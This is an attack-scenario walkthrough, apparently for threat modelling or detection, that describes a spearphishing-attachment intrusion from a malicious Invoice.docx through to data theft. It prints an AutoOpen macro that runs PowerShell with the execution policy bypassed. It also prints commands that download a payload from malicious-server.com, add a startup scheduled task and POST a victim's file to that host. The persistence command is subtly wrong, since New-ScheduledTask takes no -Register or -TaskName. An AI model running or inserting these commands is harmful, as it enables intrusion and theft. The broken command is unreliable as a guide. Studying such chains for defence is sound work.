Pattern Name: Spearphishing Attachment

Scenario Overview: This attack scenario illustrates how an attacker uses a spearphishing email with a malicious attachment to gain initial access to a target system. The attack progresses through multiple stages, involving email clients, web browsers, and office applications, ultimately leading to the execution of a malicious payload via PowerShell.

Attack Flow Breakdown:

**Stage 1: Initial Access via Spearphishing Email**
- **Application Involved**: Outlook
- **User Action**: The user receives a spearphishing email that appears to be from a trusted source, containing a malicious attachment (e.g., a Word document).
- **Key Artifacts**: 
  - Email Subject: "Important Update"
  - Attachment: `Invoice.docx`
  
```shell
# The user opens the email and downloads the attachment.
# The email is sent from a spoofed address that mimics a legitimate sender.
```

**Stage 2: Document Execution**
- **Application Involved**: Microsoft Word
- **User Action**: The user opens the `Invoice.docx` file, which contains a macro designed to execute a PowerShell command.
- **Key Artifacts**: 
  - Macro code embedded in the document that triggers on opening.
  
```shell
# The macro is executed, which may look like this:
Sub AutoOpen()
    Dim strCommand As String
    strCommand = "powershell.exe -ExecutionPolicy Bypass -EncodedCommand <encoded_command_here>"
    Shell strCommand
End Sub
# This command executes PowerShell with a bypass policy to run encoded commands.
```

**Stage 3: PowerShell Execution**
- **Application Involved**: PowerShell
- **User Action**: The macro executes a PowerShell command that downloads a secondary payload from a remote server.
- **Key Artifacts**: 
  - Command to download a malicious executable.
  - URL: `http://malicious-server.com/payload.exe`
  
```shell
# PowerShell command executed by the macro:
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe' -OutFile 'C:\Users\Victim\Downloads\payload.exe'"
# This command downloads the payload to the victim's Downloads folder.
```

**Stage 4: Payload Execution**
- **Application Involved**: Windows Explorer
- **User Action**: The user inadvertently executes the downloaded `payload.exe` file, which is disguised as a legitimate application.
- **Key Artifacts**: 
  - Executable file: `payload.exe`
  
```shell
# The user double-clicks on the downloaded file, executing the payload.
# The payload may perform actions such as establishing a reverse shell or exfiltrating data.
```

**Stage 5: Establishing Persistence**
- **Application Involved**: PowerShell
- **User Action**: The payload uses PowerShell to create a scheduled task for persistence.
- **Key Artifacts**: 
  - Scheduled task created to run the payload at startup.
  
```shell
# PowerShell command to create a scheduled task:
powershell.exe -Command "New-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'C:\Users\Victim\Downloads\payload.exe') -Trigger (New-ScheduledTaskTrigger -AtStartup) -Register -TaskName 'MaliciousTask'"
# This command ensures the payload runs every time the system starts.
```

**Stage 6: Data Exfiltration**
- **Application Involved**: PowerShell
- **User Action**: The payload executes commands to exfiltrate sensitive data to an external server.
- **Key Artifacts**: 
  - Command to send data to the attacker's server.
  - URL: `http://malicious-server.com/exfiltrate`
  
```shell
# PowerShell command to exfiltrate data:
powershell.exe -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/exfiltrate' -Method POST -Body (Get-Content 'C:\Users\Victim\Documents\sensitive_data.txt')"
# This command sends sensitive data to the attacker's server.
```
